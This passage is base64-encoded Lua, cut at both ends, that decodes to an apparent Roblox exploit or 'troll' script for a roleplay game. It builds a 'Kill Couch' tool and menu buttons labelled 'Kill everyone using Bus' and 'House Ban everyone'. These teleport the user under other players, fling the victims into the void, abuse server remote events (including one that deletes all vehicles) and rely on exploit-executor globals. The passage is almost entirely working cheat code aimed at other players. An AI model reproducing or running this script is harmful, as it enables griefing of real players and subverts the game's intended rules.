iV29ya3NwYWNlIikKbG9jYWwgdXNlcklucHV0ID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKCmxvY2FsIGxvY2FsUGxheWVyID0gcGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBjYW1lcmEgPSB3b3JsZC5DdXJyZW50Q2FtZXJhCgpsb2NhbCBUT09MX05BTUUgPSAiS2lsbCBDb3VjaCIKbG9jYWwgdG9vbEVxdWlwcGVkID0gZmFsc2UKbG9jYWwgdGFyZ2V0TmFtZSA9IG5pbApsb2NhbCB0cExvb3AgPSBuaWwKbG9jYWwgY291Y2hFcXVpcHBlZCA9IGZhbHNlCmxvY2FsIGJhc2VQYXJ0ID0gbmlsCmxvY2FsIGluaXRpYWxQb3MgPSBuaWwKbG9jYWwgcm9vdFBhcnQgPSBuaWwKCmxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCmlmIG5vdCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZChUT09MX05BTUUpIHRoZW4KCWxvY2FsIHRvb2wgPSBJbnN0YW5jZS5uZXcoIlRvb2wiKQoJdG9vbC5OYW1lID0gVE9PTF9OQU1FCgl0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UKCXRvb2wuQ2FuQmVEcm9wcGVkID0gZmFsc2UKCgl0b29sLkVxdWlwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCXRvb2xFcXVpcHBlZCA9IHRydWUKCWVuZCkKCgl0b29sLlVuZXF1aXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gZmFsc2UKCQl0YXJnZXROYW1lID0gbmlsCgkJY2xlYW51cENvdWNoKCkKCWVuZCkKCgl0b29sLlBhcmVudCA9IGJhY2twYWNrCmVuZAoKZnVuY3Rpb24gY2xlYW51cENvdWNoKCkKCWlmIHRwTG9vcCB0aGVuCgkJdHBMb29wOkRpc2Nvbm5lY3QoKQoJCXRwTG9vcCA9IG5pbAoJZW5kCgoJaWYgY291Y2hFcXVpcHBlZCB0aGVuCgkJbG9jYWwgY2hhcmFjdGVyID0gbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgkJaWYgY2hhcmFjdGVyIHRoZW4KCQkJbG9jYWwgY291Y2ggPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkNvdWNoIikKCQkJaWYgY291Y2ggdGhlbgoJCQkJY291Y2guUGFyZW50ID0gbG9jYWxQbGF5ZXIuQmFja3BhY2sKCQkJCWNvdWNoRXF1aXBwZWQgPSBmYWxzZQoJCQllbmQKCQllbmQKCWVuZAoKCWlmIGJhc2VQYXJ0IHRoZW4KCQliYXNlUGFydDpEZXN0cm95KCkKCQliYXNlUGFydCA9IG5pbAoJZW5kCgoJaWYgZ2V0Z2VudigpLkFudGlTaXQgdGhlbgoJCWdldGdlbnYoKS5BbnRpU2l0OlNldChmYWxzZSkKCWVuZAoKCWxvY2FsIGh1bWFub2lkID0gbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBsb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCglpZiBodW1hbm9pZCB0aGVuCgkJaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuUGh5c2ljcywgdHJ1ZSkKCQlodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkdldHRpbmdVcCkKCWVuZAoKCWlmIGluaXRpYWxQb3MgYW5kIHJvb3RQYXJ0IHRoZW4KCQlyb290UGFydC5DRnJhbWUgPSBpbml0aWFsUG9zCgkJaW5pdGlhbFBvcyA9IG5pbAoJZW5kCmVuZAoKZnVuY3Rpb24gZ2V0Q291Y2goKQoJbG9jYWwgY2hhcmFjdGVyID0gbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCglpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgYmFja3BhY2sgPSBsb2NhbFBsYXllci5CYWNrcGFjawoKCWlmIG5vdCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKSBhbmQgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKSB0aGVuCgkJbG9jYWwgYXJncyA9IHsgIlBpY2tpbmdUb29scyIsICJDb3VjaCIgfQoJCXJlcGxpY2F0ZWRTdG9yYWdlLlJFWyIxVG9vMWwiXTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoJCXRhc2sud2FpdCgwLjEpCgllbmQKCglsb2NhbCBjb3VjaCA9IGJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDb3VjaCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQoJaWYgY291Y2ggdGhlbgoJCWNvdWNoLlBhcmVudCA9IGNoYXJhY3RlcgoJCWNvdWNoRXF1aXBwZWQgPSB0cnVlCgllbmQKZW5kCgpmdW5jdGlvbiBnZXRSYW5kb21Qb3NpdGlvbkJlbG93KGNoYXJhY3RlcikKCWxvY2FsIHJwID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCWlmIG5vdCBycCB0aGVuIHJldHVybiBWZWN0b3IzLm5ldygpIGVuZAoJbG9jYWwgb2Zmc2V0ID0gVmVjdG9yMy5uZXcobWF0aC5yYW5kb20oLTIsIDIpLCAtNS4xLCBtYXRoLnJhbmRvbSgtMiwgMikpCglyZXR1cm4gcnAuUG9zaXRpb24gKyBvZmZzZXQKZW5kCgpmdW5jdGlvbiB0cEJlbG93KHRhcmdldCkKCWlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBteUNoYXJhY3RlciA9IGxvY2FsUGxheWVyLkNoYXJhY3RlcgoJbG9jYWwgbXlSb290UGFydCA9IG15Q2hhcmFjdGVyIGFuZCBteUNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCglsb2NhbCBodW1hbm9pZCA9IG15Q2hhcmFjdGVyIGFuZCBteUNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKCglpZiBub3QgbXlSb290UGFydCBvciBub3QgaHVtYW5vaWQgdGhlbiByZXR1cm4gZW5kCgoJaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuUGh5c2ljcywgZmFsc2UpCgoJaWYgbm90IGJhc2VQYXJ0IHRoZW4KCQliYXNlUGFydCA9IEluc3RhbmNlLm5ldygiUGFydCIpCgkJYmFzZVBhcnQuU2l6ZSA9IFZlY3RvcjMubmV3KDEwLCAxLCAxMCkKCQliYXNlUGFydC5BbmNob3JlZCA9IHRydWUKCQliYXNlUGFydC5DYW5Db2xsaWRlID0gdHJ1ZQoJCWJhc2VQYXJ0LlRyYW5zcGFyZW5jeSA9IDAuNQoJCWJhc2VQYXJ0LlBhcmVudCA9IHdvcmxkCgllbmQKCglsb2NhbCBkZXN0aW5hdGlvbiA9IGdldFJhbmRvbVBvc2l0aW9uQmVsb3codGFyZ2V0LkNoYXJhY3RlcikKCWJhc2VQYXJ0LlBvc2l0aW9uID0gZGVzdGluYXRpb24KCW15Um9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhkZXN0aW5hdGlvbikKCglodW1hbm9pZDpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5QaHlzaWNzLCB0cnVlKQplbmQKCmZ1bmN0aW9uIHRocm93V2l0aENvdWNoKHRhcmdldCkKCWlmIG5vdCB0YXJnZXQgdGhlbiByZXR1cm4gZW5kCgl0YXJnZXROYW1lID0gdGFyZ2V0Lk5hbWUKCWxvY2FsIGNoYXJhY3RlciA9IGxvY2FsUGxheWVyLkNoYXJhY3RlcgoJaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKCglpbml0aWFsUG9zID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIGNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoJcm9vdFBhcnQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJZ2V0Q291Y2goKQoKCXRwTG9vcCA9IHJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQoJCWxvY2FsIGN1cnJlbnRUYXJnZXQgPSBwbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldE5hbWUpCgkJaWYgbm90IGN1cnJlbnRUYXJnZXQgb3Igbm90IGN1cnJlbnRUYXJnZXQuQ2hhcmFjdGVyIG9yIG5vdCBjdXJyZW50VGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCgkJCWNsZWFudXBDb3VjaCgpCgkJCXJldHVybgoJCWVuZAoJCWlmIGdldGdlbnYoKS5BbnRpU2l0IHRoZW4KCQkJZ2V0Z2VudigpLkFudGlTaXQ6U2V0KHRydWUpCgkJZW5kCgkJdHBCZWxvdyhjdXJyZW50VGFyZ2V0KQoJZW5kKQoKCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCWxvY2FsIGN1cnJlbnRUYXJnZXQgPSBwbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldE5hbWUpCgkJd2hpbGUgY3VycmVudFRhcmdldCBhbmQgY3VycmVudFRhcmdldC5DaGFyYWN0ZXIgYW5kIGN1cnJlbnRUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGRvCgkJCXRhc2sud2FpdCgwLjA1KQoJCQlpZiBjdXJyZW50VGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZC5TZWF0UGFydCB0aGVuCgkJCQlsb2NhbCB2b2lkUG9zaXRpb24gPSBDRnJhbWUubmV3KDI2NS40NiwgLTQ1MC44MywgLTU5LjkzKQoJCQkJY3VycmVudFRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSB2b2lkUG9zaXRpb24KCQkJCWxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHZvaWRQb3NpdGlvbgoJCQkJdGFzay53YWl0KDAuNCkKCQkJCWNsZWFudXBDb3VjaCgpCgkJCQl0YXNrLndhaXQoMC4yKQoJCQkJaWYgaW5pdGlhbFBvcyB0aGVuCgkJCQkJbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gaW5pdGlhbFBvcwoJCQkJZW5kCgkJCQlicmVhawoJCQllbmQKCQllbmQKCWVuZCkKZW5kCgp1c2VySW5wdXQuVG91Y2hUYXA6Q29ubmVjdChmdW5jdGlvbih0b3VjaGVzLCBwcm9jZXNzZWQpCglpZiBub3QgdG9vbEVxdWlwcGVkIG9yIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBvcyA9IHRvdWNoZXNbMV0KCWxvY2FsIHJheSA9IGNhbWVyYTpTY3JlZW5Qb2ludFRvUmF5KHBvcy5YLCBwb3MuWSkKCWxvY2FsIGhpdCA9IHdvcmxkOlJheWNhc3QocmF5Lk9yaWdpbiwgcmF5LkRpcmVjdGlvbiAqIDEwMDApCglpZiBoaXQgYW5kIGhpdC5JbnN0YW5jZSB0aGVuCgkJbG9jYWwgbW9kZWwgPSBoaXQuSW5zdGFuY2U6RmluZEZpcnN0QW5jZXN0b3JPZkNsYXNzKCJNb2RlbCIpCgkJbG9jYWwgcGxheWVyID0gcGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKG1vZGVsKQoJCWlmIHBsYXllciBhbmQgcGxheWVyIH49IGxvY2FsUGxheWVyIHRoZW4KCQkJdGhyb3dXaXRoQ291Y2gocGxheWVyKQoJCWVuZAoJZW5kCmVuZCkKZW5kCn0pCgpsb2NhbCBraWxsID0gVHJvbGw6QWRkU2VjdGlvbih7TmFtZSA9ICLwn5eh77ixQWxsIG1ldGhvZHMifSkKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIktpbGwgZXZlcnlvbmUgdXNpbmcgQnVzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQoKbG9jYWwgZGVzdGluYXRpb24gPSBWZWN0b3IzLm5ldygxNDUuNTEsIC0zNzQuMDksIDIxLjU4KSAKbG9jYWwgb3JpZ2luYWxQb3NpdGlvbiA9IG5pbCAgCgpsb2NhbCBmdW5jdGlvbiBHZXRCdXMoKSAgCiAgICBsb2NhbCB2ZWhpY2xlcyA9IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZXMiKSAgCiAgICBpZiB2ZWhpY2xlcyB0aGVuICAKICAgICAgICByZXR1cm4gdmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVycy5Mb2NhbFBsYXllci5OYW1lLi4iQ2FyIikgIAogICAgZW5kICAKICAgIHJldHVybiBuaWwgIAplbmQgIAoKbG9jYWwgZnVuY3Rpb24gVHJhY2tQbGF5ZXIoc2VsZWN0ZWRQbGF5ZXJOYW1lLCBjYWxsYmFjaykKICAgIHdoaWxlIHRydWUgZG8gIAogICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuICAKICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpICAKICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbiAgCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIdW1hbm9pZCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpICAKICAgICAgICAgICAgICAgIGlmIHRhcmdldEh1bWFub2lkIGFuZCB0YXJnZXRIdW1hbm9pZC5TaXQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnVzID0gR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhkZXN0aW5hdGlvbikpICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJQbGF5ZXIgc2F0IGRvd24sIHRha2luZyBidXMgdG8gdGhlIHZvaWQhIikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2ltdWxhdGVKdW1wKCkgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBQbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCgogICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJTaW11bGF0aW5nIGZpcnN0IGp1bXAhIikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkgIAogICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiU2ltdWxhdGluZyBzZWNvbmQganVtcCEiKSAgCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBvcmlnaW5hbFBvc2l0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb3JpZ2luYWxQb3NpdGlvbiAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiUGxheWVyIHJldHVybmVkIHRvIGluaXRpYWwgcG9zaXRpb24uIikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJEZWxldGVBbGxWZWhpY2xlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiQWxsIHZlaGljbGVzIHdlcmUgZGVsZXRlZCEiKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBicmVhayAgCiAgICAgICAgICAgICAgICBlbHNlICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0ICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0aW1lID0gdGljaygpICogMzUKICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbGF0ZXJhbE9mZnNldCA9IG1hdGguc2luKHRpbWUpICogMTAgIC0tIEZhc3QgbGF0ZXJhbCBtb3ZlbWVudCAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZnJvbnRCYWNrT2Zmc2V0ID0gbWF0aC5jb3ModGltZSkgKiAyMCAgLS0gRnJvbnQvYmFjayBtb3ZlbWVudAogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnVzID0gR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUodGFyZ2V0Um9vdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDAsIGZyb250QmFja09mZnNldCkpICAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kICAKICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpICAKICAgIGVuZAogICAgCiAgICBpZiBjYWxsYmFjayB0aGVuCiAgICAgICAgY2FsbGJhY2soKQogICAgZW5kCmVuZCAgCgpsb2NhbCBmdW5jdGlvbiBTdGFydEtpbGxCdXMocGxheWVyTmFtZSwgY2FsbGJhY2spCiAgICBsb2NhbCBzZWxlY3RlZFBsYXllck5hbWUgPSBwbGF5ZXJOYW1lCgogICAgbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllciAgCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkgIAogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSAgCgogICAgb3JpZ2luYWxQb3NpdGlvbiA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lICAKCiAgICBsb2NhbCBidXMgPSBHZXRCdXMoKSAgCgogICAgaWYgbm90IGJ1cyB0aGVuICAKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTExOC44MSwgNzUuOTk4LCAtMTEzOC42MSkgIAogICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICBsb2NhbCByZW1vdGVFdmVudCA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSRSIpICAKICAgICAgICBpZiByZW1vdGVFdmVudCBhbmQgcmVtb3RlRXZlbnQ6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIikgdGhlbiAgCiAgICAgICAgICAgIHJlbW90ZUV2ZW50WyIxQ2ExciJdOkZpcmVTZXJ2ZXIoIlBpY2tpbmdDYXIiLCAiU2Nob29sQnVzIikgIAogICAgICAgIGVuZCAgCiAgICAgICAgdGFzay53YWl0KDEpICAKICAgICAgICBidXMgPSBHZXRCdXMoKSAgCiAgICBlbmQgIAoKICAgIGlmIGJ1cyB0aGVuICAKICAgICAgICBsb2NhbCBzZWF0ID0gYnVzOkZpbmRGaXJzdENoaWxkKCJCb2R5IikgYW5kIGJ1cy5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpICAKICAgICAgICBpZiBzZWF0IGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCBub3QgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCB0aGVuICAKICAgICAgICAgICAgcmVwZWF0ICAKICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gc2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDIsIDApICAKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpICAKICAgICAgICAgICAgdW50aWwgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCBvciBub3QgYnVzLlBhcmVudCAgCiAgICAgICAgZW5kICAKICAgIGVuZCAgCgogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIFRyYWNrUGxheWVyKHNlbGVjdGVkUGxheWVyTmFtZSwgY2FsbGJhY2spCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gUGVyZm9ybUFjdGlvbkZvckFsbFBsYXllcnMocGxheWVycykKICAgIGlmICNwbGF5ZXJzID09IDAgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgcGxheWVyID0gdGFibGUucmVtb3ZlKHBsYXllcnMsIDEpCiAgICBpZiBwbGF5ZXIgfj0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgU3RhcnRLaWxsQnVzKHBsYXllci5OYW1lLCBmdW5jdGlvbigpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIFBlcmZvcm1BY3Rpb25Gb3JBbGxQbGF5ZXJzKHBsYXllcnMpCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIFBlcmZvcm1BY3Rpb25Gb3JBbGxQbGF5ZXJzKHBsYXllcnMpIC0tIFNraXAgc2VsZiBhbmQgbW92ZSB0byB0aGUgbmV4dAogICAgZW5kCmVuZAoKUGVyZm9ybUFjdGlvbkZvckFsbFBsYXllcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpCiAgICBlbmQKfSkKcHJpbnQoIktpbGwgQWxsIEJ1cyBidXR0b24gY3JlYXRlZCIpCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJIb3VzZSBCYW4gZXZlcnlvbmUiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKCgpsb2NhbCBmdW5jdGlvbiBleGVjdXRlU2NyaXB0Rm9yUGxheWVyKHRhcmdldFBsYXllcikKICAgIGxvY2FsIFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgQmFja3BhY2sgPSBQbGF5ZXIuQmFja3BhY2sKICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgbG9jYWwgUm9vdFBhcnQgPSBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgSG91c2VzID0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIjAwMV9Mb3RzIikKICAgIGxvY2FsIE9sZFBvcyA9IFJvb3RQYXJ0LkNGcmFtZQogICAgbG9jYWwgQW5nbGVzID0gMAogICAgbG9jYWwgVmVoaWNsZXMgPSBXb3Jrc3BhY2UuVmVoaWNsZXMKICAgIGxvY2FsIFBvcwoKCiAgICBmdW5jdGlvbiBDaGVjaygpCiAgICAgICAgaWYgUGxheWVyIGFuZCBDaGFyYWN0ZXIgYW5kIEh1bWFub2lkIGFuZCBSb290UGFydCBhbmQgVmVoaWNsZXMgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKCgogICAgaWYgQ2hlY2soKSB0aGVuCiAgICAgICAgbG9jYWwgSG91c2UgPSBIb3VzZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLiJIb3VzZSIpCiAgICAgICAgaWYgbm90IEhvdXNlIHRoZW4KICAgICAgICAgICAgbG9jYWwgZW1wdHlIb3VzZQogICAgICAgICAgICBmb3IgXywgTG90IGluIHBhaXJzKEhvdXNlczpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgTG90Lk5hbWUgPT0gIkZvciBTYWxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG51bSBpbiBwYWlycyhMb3Q6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbnVtOklzQSgiTnVtYmVyVmFsdWUiKSBhbmQgbnVtLk5hbWUgPT0gIk51bWJlciIgYW5kIG51bS5WYWx1ZSA8IDI1IGFuZCBudW0uVmFsdWUgPiAxMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbXB0eUhvdXNlID0gTG90CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCgogICAgICAgICAgICBsb2NhbCBCdXlEZXRlY3RvciA9IGVtcHR5SG91c2U6RmluZEZpcnN0Q2hpbGQoIkJ1eUhvdXNlIikKICAgICAgICAgICAgUG9zID0gQnV5RGV0ZWN0b3IuUG9zaXRpb24KICAgICAgICAgICAgaWYgQnV5RGV0ZWN0b3IgYW5kIEJ1eURldGVjdG9yOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBCdXlEZXRlY3Rvci5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLCAtNiwgMCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpC